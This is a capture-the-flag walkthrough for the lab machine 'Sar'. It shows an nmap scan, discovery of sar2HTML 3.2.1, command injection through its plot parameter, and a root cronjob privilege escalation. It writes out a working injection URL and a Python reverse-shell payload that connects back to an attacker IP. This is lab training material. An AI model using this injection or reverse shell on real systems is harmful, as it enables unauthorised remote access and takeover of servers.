---
layout: default
title : muzec - Sar Writeup
---

![image](https://user-images.githubusercontent.com/69868171/120899266-d28fc500-c5fc-11eb-9d32-993723f2174f.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/sar]
└─$ nmap -sC -sV -oA nmap 192.168.136.35   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-05 09:43 EDT
Nmap scan report for 192.168.136.35
Host is up (0.33s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
80/tcp    open     http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
14000/tcp filtered scotty-ft
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.88 seconds
```

Seems we have 2 open ports cool let check on port 80 first which is the HTTP.

![image](https://user-images.githubusercontent.com/69868171/120899433-be989300-c5fd-11eb-8cca-f31679d427bb.png)

A simple apache web server running nice and really clean why not we check the `robots.txt` if we have anything on it.

![image](https://user-images.githubusercontent.com/69868171/120899521-1cc57600-c5fe-11eb-924f-50618e1c6e93.png)

Boom yea we do get a secret dircetory i think nice let confirm it with `IP/sar2HTML` if it our way in or a rabbit hole.

![image](https://user-images.githubusercontent.com/69868171/120899606-978e9100-c5fe-11eb-9694-c5c40a782d92.png)

sar2HTML Ver 3.2.1 let use `searchsploit` to check for some exploit if it vulnerable or not.

![image](https://user-images.githubusercontent.com/69868171/120900123-1ab0e680-c601-11eb-93a5-25a16af7afb1.png)

A python exploit and a txt one but let skip the python one i love doing things manually because that the way you need so let cat the txt one to see what we have to do to get the RCE.

![image](https://user-images.githubusercontent.com/69868171/120900206-872be580-c601-11eb-862c-1563bcd76f5e.png)

In web application you will see index.php?plot url extension. http://<ipaddr>/index.php?plot=;<command-here> will execute the command you entered. After command injection press "select # host" then your command's output will appear bottom side of the scroll screen.
  
`http://192.168.136.35/sar2HTML/index.php?plot=;id` checking the host and we have Remote code execution.

![image](https://user-images.githubusercontent.com/69868171/120900375-73cd4a00-c602-11eb-8a2f-6143f57484cc.png)

Now let use python reverse shell payload to get our shell to our terminal  `192.168.136.35/sar2HTML/index.php?plot=;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.136",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
![image](https://user-images.githubusercontent.com/69868171/120900556-43d27680-c603-11eb-870b-0cc359d1a02a.png)
 
We have shell let spawn a TTY shell now time to get root.
  
### Privilege Escalation

![image](https://user-images.githubusercontent.com/69868171/120900889-7da47c80-c605-11eb-846a-c41f1307e546.png)
  
A cronjob running on root let inject it with our payload to get root.
  
![image](https://user-images.githubusercontent.com/69868171/120901122-e4766580-c606-11eb-8e8b-5dd7f441d412.png)

Now let wait for 5min to get our shell on our Ncat listener.
  
![image](https://user-images.githubusercontent.com/69868171/120901146-1687c780-c607-11eb-9036-4f985c8ad678.png)

We are root and done.
  
Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
